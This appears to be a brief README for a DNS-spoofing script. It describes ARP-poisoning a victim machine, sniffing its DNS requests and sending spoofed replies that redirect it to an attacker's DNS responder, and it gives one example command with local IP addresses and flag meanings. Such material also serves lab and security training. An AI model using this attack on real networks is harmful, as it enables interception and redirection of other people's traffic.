# DNS-Spoofing

Attacking machine initiates ARP Poisoning on the victim machine. 
--  We will sniff for their DNS requests, then create a spoofed packet that will 
--  redirect them to our target DNS responder.


Steps:

python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8





-v: victim machine
-r: router
-d: dns responder
-i: 
